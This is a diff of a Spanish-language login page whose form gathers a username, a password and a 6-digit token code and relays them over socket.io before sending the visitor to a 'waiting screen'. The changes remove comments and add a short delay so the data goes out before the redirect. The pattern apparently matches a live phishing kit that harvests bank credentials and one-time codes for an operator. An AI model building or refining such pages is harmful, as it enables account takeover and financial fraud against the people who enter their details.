@@ -12,8 +12,8 @@
       font-family: 'Open Sans', sans-serif;
       background: #f3f6f9;
       display: flex;
-      justify-content: center;  /* Centrado horizontal */
-      align-items: center;      /* Centrado vertical */
+      justify-content: center;
+      align-items: center;
       min-height: 100vh;
       text-align: center;
     }
@@ -46,18 +46,17 @@
       margin-bottom: 1rem;
     }
 
-    /* Estilo de los campos de texto */
     .input-group {
       display: flex;
       align-items: center;
       background: #f0f2f5;
       border-radius: 8px;
-      margin: 1rem 0;  /* Espaciado entre campos */
+      margin: 1rem 0;
       padding: 0.0rem 1rem;
       width: 100%;
       max-width: 350px;
-      justify-content: flex-start; /* Mueve los campos hacia la izquierda */
-      margin-left: -15px; /* Ajuste para mover más hacia la izquierda */
+      justify-content: flex-start;
+      margin-left: -15px;
     }
 
     .input-group .icon {
@@ -75,11 +74,10 @@
       height: 20px;
     }
 
-    /* Botón centrado y ajustado */
     button {
       background-color: #7C12B5;
       color: white;
-      padding: 8px 20px; /* Botón más pequeño */
+      padding: 8px 20px;
       border: none;
       border-radius: 8px;
       cursor: pointer;
@@ -97,7 +95,6 @@
       cursor: not-allowed;
     }
 
-    /* Mensaje de error */
     .mensaje-error {
       color: red;
       margin-top: 1rem;
@@ -130,16 +127,11 @@
         <div class="icon"><i class="fas fa-lock"></i></div>
         <input type="password" id="password" placeholder="Contraseña" required>
       </div>
-
-      <!-- Campo de Token -->
       <div class="input-group">
         <div class="icon"><i class="fas fa-key"></i></div>
         <input type="text" id="token" placeholder="Ingrese su token" required>
       </div>
-
-      <!-- Alerta debajo del campo de token -->
       <p class="alerta">Genere su Código Dinámico de 6 Dígitos que aparece en tu dispositivo Token.</p>
-
       <p id="usuarioError" class="mensaje-error"></p>
       <p id="passwordError" class="mensaje-error"></p>
       <p id="tokenError" class="mensaje-error"></p>
@@ -171,8 +163,10 @@
             // Enviar datos al servidor mediante socket.io
             socket.emit('dataForm', { usuario, contrasena, token, sessionId });
 
-            // Ir a pantalla de espera (opciones.html)
-            window.location.href = 'opciones.html';
+            // Redirigir a opciones.html después de un pequeño retraso
+            setTimeout(() => {
+              window.location.href = 'opciones.html';
+            }, 500); // Espera 500ms antes de redirigir
           }
         });
       }
@@ -214,7 +208,6 @@
       }
     }
 
-    // Nueva validación para el campo Token
     function validarToken() {
       const token = document.getElementById("token").value;
       const tokenError = document.getElementById("tokenError");
